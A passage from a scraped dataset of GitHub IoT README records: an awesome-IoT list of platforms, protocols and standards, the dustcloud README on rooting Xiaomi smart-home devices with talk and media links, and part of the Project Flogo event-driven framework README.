multiprotocol interface that supports mqtt, lorawan and more. (website)\ndevicepilot - operational analytics for connected devices (includes free-forever tier).\nemq x - scalable and reliable real-time mqtt messaging engine for iot in 5g era.\nwaterstream - mqtt broker leveraging apache kafka as its own storage and distribution engine.\nnanomq - a light-weight and blazing-fast mqtt broker for iot edge platform.\nkuiper - an edge lightweight iot data analytics/streaming software implemented by golang, and it can be run at all kinds of resource-constrained edge devices.\nt6 - data-first iot platform to connect physical objects with time-series db and perform data analysis.\nlibraries and tools\ncylon.js - cylon.js is a javascript framework for robotics, physical computing, and the internet of things. it makes it incredibly easy to command robots and devices.\nluvit - luvit implements the same apis as node.js, but in lua ! while this framework is not directly involved with iot development, it is still a great way to rapidly build powerful, yet memory efficient, embedded web applications.\njohnny-five - johnny-five is the original javascript robotics programming framework. released by bocoup in 2012, johnny-five is maintained by a community of passionate software developers and hardware engineers.\npi4j - pi4j is intended to provide a friendly object-oriented i/o api and implementation libraries for java programmers to access the full i/o capabilities of the raspberry pi platform.\nwiringpi - wiringpi is a gpio access library written in c for the bcm2835 used in the raspberry pi.\nnode-red - a visual -----> tool !!!  for wiring the internet of things.\nmimic iot simulator - simulate large iot environments for agile development / testing / proof-of-concept / training of iot applications based on mqtt, coap, rest\nmqtt explorer - tool to visualize your mqtt topics in a topic hierarchy, a mqtt swiss-army knife.\nops - a free open source tool to build, run, and deploy linux applications as unikernels.\nsmartobject - a smart object class that helps you with creating ipso smart objects in your javascript applications. see also: ipso alliance technical archive.\nunited manufacturing hub - the open-source manufacturing app platform (combines various open source solutions and packages them in a helm chart, for example nodered, vernemq and timescaledb)\nquestdb - an open source time series database used for real-time analytics and high-performance applications. supports high-throughput ingestion over influxdb line protocol and sql as a query language.\nmiscellaneous\namazon dash - amazon dash button is a wi-fi connected device that reorders your favorite item with the press of a button.\nfreeboard - a real-time interactive dashboard and visualization creator implementing an intuitive drag & drop interface.\nnebula - a docker orchestrator designed to manage iot devices.\ngladys - gladys is an open-source program that runs on the raspberry pi and integrates into the entire home network system.\nprotocols and networks\nphysical layer\n- 802.15.4 (ieee)\nieee 802.15.4 is a standard which specifies the physical layer and media access control for low-rate wireless personal area networks (lr-wpans). it is maintained by the ieee 802.15 working group, which has defined it in 2003. it is the basis for the zigbee, isa100.11a, wirelesshart, and miwi specifications, each of which further extends the standard by developing the upper layers which are not defined in ieee 802.15.4. alternatively, it can be used with 6lowpan and standard internet protocols to build a wireless embedded internet. - wikipedia\nieee standard 802.15.4 intends to offer the fundamental lower network layers of a type of wireless personal area network (wpan) which focuses on low-cost, low-speed ubiquitous communication between devices. it can be contrasted with other approaches, such as wi-fi, which offer more bandwidth and require more power. the emphasis is on very low cost communication of nearby devices with little to no underlying infrastructure, intending to exploit this to lower power consumption even more.\n- bluetooth (bluetooth special interest group)\nbluetooth is a wireless technology standard for exchanging data over short distances (using short-wavelength uhf radio waves in the ism band from 2.4 to 2.485 ghz) from fixed and mobile devices, and building personal area networks (pans). invented by telecom vendor ericsson in 1994, it was originally conceived as a wireless alternative to rs-232 data cables. it can connect several devices, overcoming problems of synchronization. - wikipedia\nbluetooth is managed by the bluetooth special interest group (sig), which has more than 25,000 member companies in the areas of telecommunication, computing, networking, and consumer electronics.\n- bluetooth low energy (bluetooth special interest group)\nbluetooth low energy (bluetooth le, ble, marketed as bluetooth smart) is a wireless personal area network technology designed and marketed by the bluetooth special interest group aimed at novel applications in the healthcare, fitness, beacons, security, and home entertainment industries. - wikipedia\ncompared to classic bluetooth, bluetooth smart is intended to provide considerably reduced power consumption and cost while maintaining a similar communication range. the bluetooth sig predicts that by 2018 more than 90 percent of bluetooth-enabled smartphones will support bluetooth smart.\nec-gsm-iot (ec-gsm-iot group)\nextended coverage gsm iot (ec-gsm-iot) is a standard-based low power wide area technology. it is based on egprs and designed as a high capacity, long range, low energy and low complexity cellular system for iot communications.\nthe ec-gsm-iot network trials have begun, with the first commercial launches planned for 2017. supported by all major mobile equipment, chip set and module manufacturers, ec-gsm-iot networks will co-exist with 2g, 3g, and 4g mobile networks. it will also benefit from all the security and privacy mobile network features, such as support for user identity confidentiality, entity authentication, confidentiality, data integrity, and mobile equipment identification.\n- lorawan (lora alliance)\na lorawan wide area network allows low bit rate communication from and to connected objects, thus participating to internet of things, machine-to-machine m2m, and smart city. - wikipedia\nthis technology is standardized by the lora alliance. it was initially developed by cycleo, which was acquired by semtech in 2012. lorawan is an acronym for long range wide-area network.\nnb-iot (3gpp)\nnarrowband iot (nb-iot) is a low power wide area network (lpwan) radio technology standard that has been developed to enable a wide range of devices and services to be connected using cellular telecommunications bands. - wikipedia\nnb-iot is a narrowband radio technology designed for the internet of things (iot), and is one of a range of mobile iot (miot) technologies standardized by the 3rd generation partnership project (3gpp).\n- sigfox (sigfox)\nsigfox is a french firm that builds wireless networks to connect low-energy objects such as electricity meters, smart watches, and washing machines, which need to be continuously on and emitting small amounts of data. its infrastructure is intended to be a contribution to what is known as the internet of things (iot). - wikipedia\nsigfox describes itself as \"the first and only company providing global cellular connectivity for the internet of things.\" its infrastructure is \"completely independent of existing networks, such as telecommunications networks.\" sigfox seeks to provide the means for the \"deployment of billions of objects and thousands of new uses\" with the long-term goal of \"having petabytes of data produced by everyday objects\".\n- wi-fi (wi-fi alliance)\nwi-fi (or wifi) is a local area wireless computer networking technology that allows electronic devices to network, mainly using the 2.4 gigahertz (12 cm) uhf and 5 gigahertz (6 cm) shf ism radio bands. - wikipedia\nthe wi-fi alliance defines wi-fi as any \"wireless local area network\" (wlan) product based on the institute of electrical and electronics engineers' (ieee) 802.11 standards.[1] however, the term \"wi-fi\" is used in general english as a synonym for \"wlan\" since most modern wlans are based on these standards. \"wi-fi\" is a trademark of the wi-fi alliance. the \"wi-fi certified\" trademark can only be used by wi-fi products that successfully complete wi-fi alliance interoperability certification testing.\nnetwork / transport layer\n- 6lowpan (ietf)\n6lowpan is an acronym of ipv6 over low power wireless personal area networks. 6lowpan is the name of a concluded working group in the internet area of the ietf. - wikipedia\nthe 6lowpan concept originated from the idea that \"the internet protocol could and should be applied even to the smallest devices,\"and that low-power devices with limited processing capabilities should be able to participate in the internet of things. the 6lowpan group has defined encapsulation and header compression mechanisms that allow ipv6 packets to be sent and received over ieee 802.15.4 based networks. ipv4 and ipv6 are the work horses for data delivery for local-area networks, metropolitan area networks, and wide-area networks such as the internet. likewise, ieee 802.15.4 devices provide sensing communication-ability in the wireless domain. the inherent natures of the two networks though, are different.\n- thread (thread group)\nthread is an ipv6 based protocol for \"smart\" household devices to communicate on a network.\nin july 2014 google inc's nest labs announced a working group with the companies samsung, arm holdings, freescale, silicon labs, big ass fans and the lock company yale in an attempt to have thread become the industry standard by providing thread certification for products. other protocols currently in use include zigbee and bluetooth smart. thread uses 6lowpan, which in turn uses the ieee 802.15.4 wireless protocol with mesh communication, as does zigbee and other systems. thread however is ip-addressable, with cloud access and aes encryption. it supports over 250 devices on a network.\n- zigbee (zigbee alliance)\nzigbee is a ieee 802.15.4-based specification for a suite of high-level communication protocols used to create personal area networks with small, low-power digital radios. - wikipedia\nthe technology defined by the zigbee specification is intended to be simpler and less expensive than other wireless personal area networks (wpans), such as bluetooth or wi-fi. applications include wireless light switches, electrical meters with in-home-displays, traffic management systems, and other consumer and industrial equipment that requires short-range low-rate wireless data transfer.\n- z-wave (z-wave alliance)\nz-wave is a wireless communications specification designed to allow devices in the home (lighting, access controls, entertainment systems and household appliances, for example) to communicate with one another for the purposes of home automation. - wikipedia\nz-wave technology minimizes power consumption so that it is suitable for battery-operated devices. z-wave is designed to provide, reliable, low-latency transmission of small data packets at data rates up to 100kbit/s, unlike wi-fi and other ieee 802.11-based wireless lan systems that are designed primarily for high data rates. z-wave operates in the sub-gigahertz frequency range, around 900 mhz.\napplication layer\ncoap (ietf)\nconstrained application protocol (coap) is a software protocol intended to be used in very simple electronics devices that allows them to communicate interactively over the internet. - wikipedia\ncoap is particularly targeted for small low power sensors, switches, valves and similar components that need to be controlled or supervised remotely, through standard internet networks. coap is an application layer protocol that is intended for use in resource-constrained internet devices, such as wsn nodes.\ndtls (ietf)\nthe datagram transport layer security (dtls) communications protocol provides communications security for datagram protocols. - wikipedia\ndtls allows datagram-based applications to communicate in a way that is designed[by whom?] to prevent eavesdropping, tampering, or message forgery. the dtls protocol is based on the stream-oriented transport layer security (tls) protocol and is intended to provide similar security guarantees.\n- eddystone (google)\neddystone is a beacon technology profile released by google in july 2015. the open source, cross-platform software gives users location and proximity data via bluetooth low-energy beacon format. - wikipedia\nthough similar to the ibeacon released by apple in 2013, eddystone works on both android and ios, whereas ibeacon is limited to ios platforms. a practical application of both softwares is that business owners can target potential customers based on the location of their smartphones in real time.\n- http (ietf)\nthe hypertext transfer protocol (http) is an application protocol for distributed, collaborative, hypermedia information systems. http is the foundation of data communication for the world wide web. - wikipedia\nthe standards development of http was coordinated by the internet engineering task force (ietf) and the world wide web consortium (w3c), culminating in the publication of a series of requests for comments (rfcs). the first definition of http/1.1, the version of http in common use, occurred in rfc 2068 in 1997, although this was obsoleted by rfc 2616 in 1999.\n- ibeacon (apple)\nibeacon is a protocol standardized by apple and introduced at the apple worldwide developers conference in 2013. - wikipedia\nibeacon uses bluetooth low energy proximity sensing to transmit a universally unique identifier picked up by a compatible app or operating system. the identifier can be used to determine the device's physical location, track customers, or trigger a location-based action on the device such as a check-in on social media or a push notification.\n- mqtt (ibm)\nmqtt (formerly mq telemetry transport) is a publish-subscribe based \"light weight\" messaging protocol for use on top of the tcp/ip protocol. it is designed for connections with remote locations where a \"small code footprint\" is required or the network bandwidth is limited. - wikipedia\nthe publish-subscribe messaging pattern requires a message broker. the broker is responsible for distributing messages to interested clients based on the topic of a message. andy stanford-clark and arlen nipper of cirrus link solutions authored the first version of the protocol in 1999.\n- pjon\npjon\u00ae (padded jittering operative network) is an arduino compatible, multi-master, multi-media network protocol. it proposes a standard, it is designed as a framework and implements a totally software emulated network protocol stack that can be easily cross-compiled on many architectures like attiny, atmega, esp8266, esp32, stm32, teensy, raspberry pi, linux, windows x86 and apple machines. it is a valid tool to quickly and comprehensibly build a network of devices. visit wiki and documentation to know more about the pjon standard.\npjon is used in thousands of devices and its community has spread worldwide because of the following 6 key factors: new technology, multi-media support, increased security, increased reliability, high flexibility and low cost.\n- stomp\nsimple (or streaming) text oriented message protocol (stomp), formerly known as ttmp, is a simple text-based protocol, designed for working with message-oriented middleware (mom). - wikipedia\nstomp provides an interoperable wire format that allows stomp clients to talk with any message broker supporting the protocol. it is thus language-agnostic, meaning a broker developed for one programming language or platform can receive communications from client software developed in another language.\n- websocket\nwebsocket is a protocol providing full-duplex communication channels over a single tcp connection. - wikipedia\nwebsocket is designed to be implemented in web browsers and web servers, but it can be used by any client or server application. the websocket protocol is an independent tcp-based protocol. the websocket protocol makes more interaction between a browser and a website possible, facilitating live content and the creation of real-time games. this is made possible by providing a standardized way for the server to send content to the browser without being solicited by the client, and allowing for messages to be passed back and forth while keeping the connection open.\n- xmpp (ietf)\nextensible messaging and presence protocol (xmpp) is a communications protocol for message-oriented middleware based on xml (extensible markup language). - wikipedia\nit enables the near-real-time exchange of structured yet extensible data between any two or more network entities. designed to be extensible, the protocol has also been used for publish-subscribe systems, signalling for voip, video, file transfer, gaming, internet of things (iot) applications such as the smart grid, and social networking services.\ntechnologies\nthis sections regroups a curated list of awesome technologies that are closely related to the iot world.\n- nfc\nnear field communication (nfc) is the set of protocols that enable electronic devices to establish radio communication with each other by touching the devices together, or bringing them into proximity to a distance of typically 10cm or less. - wikipedia\n- opcua\nopc-ua is a not only a protocol for industrial automation but also a technology that allows semantic description and object modelling of industrial environment. wikipedia\nstandards and alliances\nstandards\netsi m2m - the etsi technical committee is developing standards for machine to machine communications.\nonem2m - the purpose and goal of onem2m is to develop technical specifications which address the need for a common m2m service layer that can be readily embedded within various hardware and software, and relied upon to connect the myriad of devices in the field with m2m application servers worldwide.\nopcua - opc unified architecture (opc ua) is an industrial m2m communication protocol for interoperability developed by the opc foundation.\nocf - ocf, the open connectivity foundation, develop standards and certification for devices involved in the internet of things (iot) based around constrained application protocol (coap).\nw3c wot - the w3c working group for the web of things (wot) seeks to counter the fragmentation of the iot by using and extending existing, standardized web technologies. by providing standardized metadata and other re-usable technological building blocks, w3c wot enables easy integration across iot platforms and application domains.\nalliances\naioti - the internet of things innovation (aioti) aims to strengthen links and build new relationships between the different iot players (industries, smes, startups) and sectors.\nbluetooth special interest group - the bluetooth special interest group (sig) is the body that oversees the development of bluetooth standards and the licensing of the bluetooth technologies and trademarks to manufacturers.\nipso alliance - the ipso alliance provides a foundation for industry growth by fostering awareness, providing education, promoting the industry, generating research, and creating a better understanding of ip and its role in the internet of things.\nlora alliance - the lora alliance is an open, non-profit association of members that believes the internet of things era is now. it was initiated by industry leaders with a mission to standardize low power wide area networks (lpwan) being deployed around the world to enable internet of things (iot), machine-to-machine (m2m), and smart city, and industrial applications.\nopc foundation - the mission of the opc foundation is to manage a global organization in which users, vendors and consortia collaborate to create data transfer standards for multi-vendor, multi-platform, secure and reliable interoperability in industrial automation. to support this mission, the opc foundation creates and maintains specifications, ensures compliance with opc specifications via certification testing and collaborates with industry-leading standards organizations.\nthread group - the thread group, composed of members from nest, samsung, arm, freescale, silicon labs, big ass fans and yale, drives the development of the thread network protocol.\nwi-fi alliance - wi-fi alliance\u00ae is a worldwide network of companies composed of several companies forming a global non-profit association with the goal of driving the best user experience with a new wireless networking technology \u2013 regardless of brand.\nzigbee alliance - the zigbee alliance is an open, non-profit association of approximately 450 members driving development of innovative, reliable and easy-to-use zigbee standards.\nz-wave alliance - established in 2005, the z-wave alliance is comprised of industry leaders throughout the globe that are dedicated to the development and extension of z-wave as the key enabling technology for 'smart' home and business applications.\nresources\nbooks\nabusing the internet of things: blackouts, freakouts, and stakeouts (2015) by nitesh dhanjani [5.0]\nfuture with billions of connected \"things\" includes monumental security concerns. this practical book explores how malicious attackers can abuse popular iot-based devices, including wireless led lightbulbs, electronic door locks, baby monitors, smart tvs, and connected cars.\nbuilding wireless sensor networks: with zigbee, xbee, arduino, and processing (2011) by robert faludi [4.5]\nget ready to create distributed sensor systems and intelligent interactive devices using the zigbee wireless networking protocol and series 2 xbee radios. by the time you're halfway through this fast-paced, hands-on guide, you'll have built a series of useful projects, including a complete zigbee wireless network that delivers remotely sensed data.\ndesigning the internet of things (2013) by adrian mcewen and hakim cassimally [4.0]\nwhether it's called physical computing, ubiquitous computing, or the internet of things, it's a hot topic in technology: how to channel your inner steve jobs and successfully combine hardware, embedded software, web services, electronics, and cool design to create cutting-edge devices that are fun, interactive, and practical. if you'd like to create the next must-have product, this unique book is the perfect place to start.\ngetting started with bluetooth low energy: tools and techniques for low-power networking (2014) by kevin townsend, carles cuf\u00ed, akiba and robert davidson [4.5]\nthis book provides a solid, high-level overview of how devices use ble to communicate with each other. you'll learn useful low-cost tools for developing and testing ble-enabled mobile apps and embedded firmware and get examples using various development platforms including ios and android for app developers and embedded platforms for product designers and hardware engineers.\nsmart things: ubiquitous computing user experience design (2010) by mike kuniavsky [4.5]\nsmart things presents a problem-solving approach to addressing designers' needs and concentrates on process, rather than technological detail, to keep from being quickly outdated. it pays close attention to the capabilities and limitations of the medium in question and discusses the tradeoffs and challenges of design in a commercial environment.\njavascript on things: hardware for web developers (2018 - est.) by lyza danger gardner [early access book]\njavascript on things is your first step into the exciting and downright entertaining world of programming for small electronics. if you know enough javascript to hack a website together, you'll be making things bleep, blink and spin faster than you can say \"nodebot\". this fully-illustrated, hands-on book shows you how to get going with platforms like arduino, tessel, and raspberry pi.\narticles\na simple explanation of 'the internet of things' (forbes) - this article attemps to give an answer to what exactly is the \u201cinternet of things\u201d and what impact it is going to have on us.\niot security. is there an app for that ? - the internet of things world conference investigates iot application development, security, and business models.\nthe iot testing atlas - a testing methodology for managing the permutations of parameters while testing an iot based product.\nhow to begin with the amazon timestream - a step-by-step guide to aws timestream - a time series database to collect iot data over-time.\npapers\na reference architecture for the internet of things - this white paper introduces a reference architecture for the internet of things (iot): this includes the devices as well as the server-side and cloud architecture required to interact with and manage the devices.\ndeveloping solutions for the internet of things - intel's vision in enabling secure and seamless solutions for the internet of things (iot).\nevaluation of indoor positioning based on bluetooth smart technology - master of science thesis in the programme computer systems and networks.\niot: a vision, architectural elements, and future directions - this paper presents a cloud centric vision for worldwide implementation of internet of things. the key enabling technologies and application domains that are likely to drive iot research in the near future are discussed.\nrealizing the potential of the internet of things - a white paper from the telecommunications industry association (tia) written in the form of a set of recommendations to policy maker on leveraging and realizing the potential of the internet of things market.\nthe internet of things: evolution or revolution ? - this white paper compares the current internet of things market rise to other industrial revolutions, the challenges it introduces, as well as its consequences on our daily lives.\nlicense\nto the extent possible under law, halim qarroum has waived all copyright and related or neighboring rights to this work.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000058, "year": null}, {"Unnamed: 0": 65, "autor": 65, "date": null, "content": "Welcome to our repository for reverse engineering and rooting of the Xiaomi Smart Home Devices. We provide you methods how to root your device without opening it or breaking the warranty seal (on your own risk).\nThe documentation of the devices (photos, datasheets, uart logs, etc) was moved to a new repo dustcloud-documentation\nPlease take a look at the Dustcloud Wiki, which also contains instructions on how to root and flash your device: (https://github.com/dgiese/dustcloud/wiki)\nTalks\nThe content of the presentation differs from event to event. If you want to get an overview of the topics I am talking about, you find the overview here: Overview over all topics in presentations\n[Sep 2018] I was invited by BeyondSecurity to give a talk at BeVX 2018 in Hong Kong: BeVX 2018 slides\n[Aug 2018] I have given two talks at DEFCON26 (101-track and IoT-Village), both are recorded:\n\"Having fun with IoT: Reverse Engineering and Hacking of Xiaomi IoT Devices\": DEFCON26 101-track Slides\n\"How-to modify ARM Cortex-M based firmware: A step-by-step approach for Xiaomi devices\": DEFCON26 IoT Village Slides\n[Jul 2018] I was on tour in Taiwan@HITCON14 Community: HITCON14 CMT slides\n[Feb 2018] We had a talk at Recon BRX 2018. The presentation can be found here\n[Dec 2017] Our talk at 34C3: Recording hosted at media.ccc.de, updated PDF.\nRecommended resources / links\nFlole App: alternative way to control the vacuum robot, instead of Xiaomi's Mi Home App. Is able to control and root your vacuum cleaner. Enables the use of various speech packages. https://xiaomi.flole.de/\nRoboter-Forum.com: German speaking forum with a lot of information about all sorts of robots. Contains special subforums for Xiaomi rooting. Primary resource for beginners. http://www.roboter-forum.com/\nPython-miio: Python library & console tool for controlling Xiaomi smart appliances. https://github.com/rytilahti/python-miio\nInteresting Robotics class project \"ROS on Xiaomi Robot\" (by N. Dave, S. Pozder, J. Tan and P. Terrasi) advised by Prof. Hanumant Singh@NEU Field Robotics Lab: https://gitlab.com/EECE-5698-Group-7\nCommunication for the community\nYes, there is a telegram channel.\nIf you do not want to use telegram, you can use the Matrix.to channel or our IRC-Channel #dustcloudproject on Freenode, which is bridged to the matrix channel.\nIn theory you can contact me via twitter.\nI am communicating announcements over all channels.\nPlease inform yourself in the forums and with the howtos before you post in this channel. Otherwise your message is very likely to be ignored.\nContact\nDennis Giese <dgiese[at]mit.edu> / twitter\nDaniel Wegemer <daniel[at]wegemer.com>\nPress information\nIoT will very likely become a very important topic in the future. If you like to know more about IoT security, you can visit me at Northeastern University in Boston, US. Please contact me.\nAcknowledgements:\nProf. Matthias Hollick at Secure Mobile Networking Lab (SEEMOO)\nProf. Guevara Noubir (CCIS, Northeastern University)\nIlfak Guilfanov / Hex-Rays: for their great tool \"IDA Pro\"\nMedia coverage:\nhttps://www.golem.de/news/reverse-engineering-das-xiaomi-oekosystem-vom-hersteller-befreien-1802-132878.html\nhttps://www.kaspersky.com/blog/xiaomi-mi-robot-hacked/12567/\nhttps://www.golem.de/news/xiaomi-mit-einem-stueck-alufolie-autonome-staubsauger-rooten-1712-131883.html\nhttp://www.zeit.de/digital/datenschutz/2017-12/34c3-hack-staubsauger-iot\nhttps://hackaday.com/2017/12/27/34c3-the-first-day-is-a-doozy/\nhttps://m.heise.de/newsticker/meldung/34C3-Vernetzter-Staubsauger-Roboter-aus-China-gehackt-3928360.html\nhttps://www.notebookcheck.com/Security-Staubsauger-sammelt-neben-Staub-auch-Daten-ueber-die-Wohnung.275668.0.html\nhttps://derstandard.at/2000071134392/Sicherheitsforscher-hacken-Staubsaugerroboter-und-finden-Bedenkliches", "link": "https://github.com/dgiese/dustcloud", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "welcome to our repository for reverse engineering and rooting of the xiaomi smart home devices. we provide you methods how to root your device without opening it or breaking the warranty seal (on your own risk).\nthe documentation of the devices (photos, datasheets, uart logs, etc) was moved to a new repo dustcloud-documentation\nplease take a look at the dustcloud wiki, which also contains instructions on how to root and flash your device: (https://github.com/dgiese/dustcloud/wiki)\ntalks\nthe content of the presentation differs from event to event. if you want to get an overview of the topics i am talking about, you find the overview here: overview over all topics in presentations\n[sep 2018] i was invited by beyondsecurity to give a talk at bevx 2018 in hong kong: bevx 2018 slides\n[aug 2018] i have given two talks at defcon26 (101-track and iot-village), both are recorded:\n\"having fun with iot: reverse engineering and hacking of xiaomi iot devices\": defcon26 101-track slides\n\"how-to modify arm cortex-m based firmware: a step-by-step approach for xiaomi devices\": defcon26 iot village slides\n[jul 2018] i was on tour in taiwan@hitcon14 community: hitcon14 cmt slides\n[feb 2018] we had a talk at recon brx 2018. the presentation can be found here\n[dec 2017] our talk at 34c3: recording hosted at media.ccc.de, updated pdf.\nrecommended resources / links\nflole app: alternative way to control the vacuum robot, instead of xiaomi's mi home app. is able to control and root your vacuum cleaner. enables the use of various speech packages. https://xiaomi.flole.de/\nroboter-forum.com: german speaking forum with a lot of information about all sorts of robots. contains special subforums for xiaomi rooting. primary resource for beginners. http://www.roboter-forum.com/\npython-miio: python library & console -----> tool !!!  for controlling xiaomi smart appliances. https://github.com/rytilahti/python-miio\ninteresting robotics class project \"ros on xiaomi robot\" (by n. dave, s. pozder, j. tan and p. terrasi) advised by prof. hanumant singh@neu field robotics lab: https://gitlab.com/eece-5698-group-7\ncommunication for the community\nyes, there is a telegram channel.\nif you do not want to use telegram, you can use the matrix.to channel or our irc-channel #dustcloudproject on freenode, which is bridged to the matrix channel.\nin theory you can contact me via twitter.\ni am communicating announcements over all channels.\nplease inform yourself in the forums and with the howtos before you post in this channel. otherwise your message is very likely to be ignored.\ncontact\ndennis giese <dgiese[at]mit.edu> / twitter\ndaniel wegemer <daniel[at]wegemer.com>\npress information\niot will very likely become a very important topic in the future. if you like to know more about iot security, you can visit me at northeastern university in boston, us. please contact me.\nacknowledgements:\nprof. matthias hollick at secure mobile networking lab (seemoo)\nprof. guevara noubir (ccis, northeastern university)\nilfak guilfanov / hex-rays: for their great tool \"ida pro\"\nmedia coverage:\nhttps://www.golem.de/news/reverse-engineering-das-xiaomi-oekosystem-vom-hersteller-befreien-1802-132878.html\nhttps://www.kaspersky.com/blog/xiaomi-mi-robot-hacked/12567/\nhttps://www.golem.de/news/xiaomi-mit-einem-stueck-alufolie-autonome-staubsauger-rooten-1712-131883.html\nhttp://www.zeit.de/digital/datenschutz/2017-12/34c3-hack-staubsauger-iot\nhttps://hackaday.com/2017/12/27/34c3-the-first-day-is-a-doozy/\nhttps://m.heise.de/newsticker/meldung/34c3-vernetzter-staubsauger-roboter-aus-china-gehackt-3928360.html\nhttps://www.notebookcheck.com/security-staubsauger-sammelt-neben-staub-auch-daten-ueber-die-wohnung.275668.0.html\nhttps://derstandard.at/2000071134392/sicherheitsforscher-hacken-staubsaugerroboter-und-finden-bedenkliches", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000065, "year": null}, {"Unnamed: 0": 66, "autor": 66, "date": null, "content": "Project Flogo is an Open Source ecosystem for event-driven apps\nEcosystem | Core | Flows | Streams | Flogo Rules | Go Developers | When to use Flogo | Contributing | License\nProject Flogo is an ultra-light, Go-based open source ecosystem for building event-driven apps. Event-driven, you say? Yup, the notion of triggers and actions are leveraged to process incoming events. An action, a common interface, exposes key capabilities such as application integration, stream processing, etc.\nApp = Trigger(s) + Actions[&Activities]\nTriggers\nreceive data from external sources.\nare managed by a configurable threading model\nhave a common interface enabling anyone to build a Flogo trigger.\nHandlers\ndispatch events to actions\nActions\nprocess events in a manner suitable with the implementation\nhave a common interface enabling opinionated event processing capabilities\nProject Flogo Ecosystem\nAll capabilities within the Flogo Ecosystem have a few things in common, they all process events (in a manner suitable for the specific purpose) and they all implement the action interface exposed by Flogo Core.\nSome of the key highlights include:\n\ud83c\udf88 Ultra-light 20x-50x lighter than Java or Node.js\n\u26a1\ufe0f Event-driven Powerful event-driven programming model based on triggers and actions\n\u2699\ufe0f Common core a single, common core enables reuse and flexibility across all eventing constructs\n\u270f\ufe0f Golang based Written entirely in Golang for efficiency\n\ud83d\udcaa Deployment flexibility Deploy as ultra-lightweight serverless functions, containers or static binaries on IoT edge devices\n\ud83e\udde0 Native machine learning Purpose built activity for TensorFlow SavedModel inferencing\n\ud83d\ude0d 100% Open Source for your dev & hacking pleasure\nIntegration Flows Application Integration process engine with conditional branching and a visual development environment\nStream Processing a simple pipeline-based stream processing action with event joining capabilities across multiple triggers & aggregation over time windows\nContextual Decisioning Declarative Rules for Real-time Contextual Decisions\nMicrogateway Microgateway pattern for conditional, content-based routing, JWT validation, rate limiting, circuit breaking and other common patterns\nThe concept is simple, an event is just that, an event, how it\u2019s processed is what differs. Flogo Core eases the burden by enabling a common set of functionality, such as:\nthreading\nlogging\ndata type coercion\ndata mapping\ntracing & monitoring hooks\nWhile also exposing a common set of contributions via activities and triggers. For example, all available triggers can be leveraged to dispatch events to any action implementation, that is, flows for application integration, streams for stream processing, rules for contextual rule processing, etc.\nFlogo Core\nFlogo Core is an event-driven app framework used to develop apps for the cloud & IoT edge. It can also be thought of as a lightweight app kernel used by open source & commercial solutions.\nFlogo Core provides the following key benefits:\n\u26d3 Action chaining enables communication between one or more capabilities in a single, sub 10MB binary!\n\ud83c\udfd7 Common contribution model build activities and triggers that can be leveraged by all capabilities\n\ud83d\udd28 Extensible easily extend the capabilities available by building your own action using the common interfaces\nFlogo Core Contribution Model\nFlogo Core exposes three principal contribution interfaces that enable developers to build common capabilities and functionality. These contribution interfaces include:\nTrigger Interface a common interface for building event-consumers that dispatch events to one or more actions. The Kafka subscriber is an example of a trigger.\nActivity Interface a common interface for exposing common application logic in a reusable manner. Think of this as a function, such as write to database, publish to Kafka, etc that can be used by all Flogo apps.\nAction Interface a common interface for processing events. Actions contain the specific capability logic, such as integration, stream processing, rule processing, etc. Actions have a great deal of flexibility in how they\u2019re developed and how developers leverage actions within their overall applications. For example, flows and streams expose JSON-based DSLs & Go APIs for maximum developer flexibility.\nRepos\nProject Flogo consists of the following sub-projects available as separate repos:\nflogo-cli: Command line tools for building Flogo apps & extensions\nflogo-core: The core Flogo library\nflogo-contrib: Flogo contributions/extensions\nproject-flogo/stream: Flogo Streams Action\nproject-flogo/rules: Contextual, deterministic rules action\nproject-flogo/microgateway: Flogo Microgateway Action\nproject-flogo/flogo-web: Flogo Web UI\nFlogo Flows\nFlogo Flows provides application integration capabilities and includes the following key highlights.\n\ud83c\udf08 Painless development Visual modeler with step-back debugging capabilities & elegant DSL\n\u2699\ufe0f Ultra-light process engine for conditional flow control\nGetting Started\nWe've made getting started with Flogo Flows as easy as possible. The current set of tooling is designed for:\nServerless function developers\nCloud-native microservices developers\nIoT Solutions developers\nGo Developers\nZero-code Developers\nIf your background is in or you prefer to develop your apps using zero-coding environments, then read on, because we\u2019ve got something special for you.\nFlows Web UI is available via Docker Hub or Flogo.io. The Docker image contains the Flows Web UI along with all required components to begin developing, testing and building deployable artifacts right from your web browser.\nTo report any issues with the Issue tracker on this project.\nFlogo Streams\nEdge devices have the potential for producing millions or even billions of events at rapid intervals, often times the events on their own are meaningless, hence the need to provide basic streaming operations against the slew of events.\nA native streaming action as part of the Project Flogo Ecosystem accomplishes the following primary objectives:\nEnables apps to implement basic streaming constructs in a simple pipeline fashion\nProvides non-persistent state for streaming operations\nStreams are persisted in memory until the end of the pipeline\nServes as a pre-process pipeline for raw data to perform basic mathematical and logical operations. Ideal for feeding ML models\nSome of the key highlights include:\n\ud83d\ude00 Simple pipeline construct enables a clean, easy way of dealing with streams of data\n\u23f3 Stream aggregation across streams using time or event tumbling & sliding windows\n\ud83d\ude4c Join streams from multiple event sources\n\ud83c\udf2a Filter out the noise with stream filtering capabilities\nGetting Started\nWe\u2019ve made building powerful streaming pipelines as easy as possible. Develop your pipelines using:\nA simple, clean JSON-based DSL\nGolang API\nSee the sample below of an aggregation pipeline (for brevity, the triggers and metadata of the resource has been omitted). Also don\u2019t forget to check out the examples in the project-flogo/stream repo.\n\"stages\": [\n{\n\"ref\": \"github.com/project-flogo/stream/activity/aggregate\",\n\"settings\": {\n\"function\": \"sum\",\n\"windowType\": \"timeTumbling\",\n\"windowSize\": \"5000\"\n},\n\"input\": {\n\"value\": \"=$.input\"\n}\n},\n{\n\"ref\": \"github.com/project-flogo/contrib/activity/log\",\n\"input\": {\n\"message\": \"=$.result\"\n}\n}\n]\nFlogo Rules\nProcessing Events in real-time to determine next best action is an important function of Event driven applications. With the vast amount of events that are generated from different sources, making sense of the information in a given context can be immensely valuable.\nFlogo Rules simplifies the complexity involved with real-time contextual decisions.\nFlogo Rules supports\nDeclarative Rules to define conditional logic and trigger result rules\nJoins/Correlations across multiple Event sources\nAbility to define Rule Priorities\nTimer Events; Configurable TTL (time to live) -1 - no expiry, 0 - event expiry set to end of run to completion cycle.\nForward chaining for Inferencing\nThe CLI\nThe CLI is used to build all applications that leverage the JSON-based DSL. If you\u2019re using the Go API to build your apps, feel free to just go build your stuff without the flogo CLI.\nGetting started 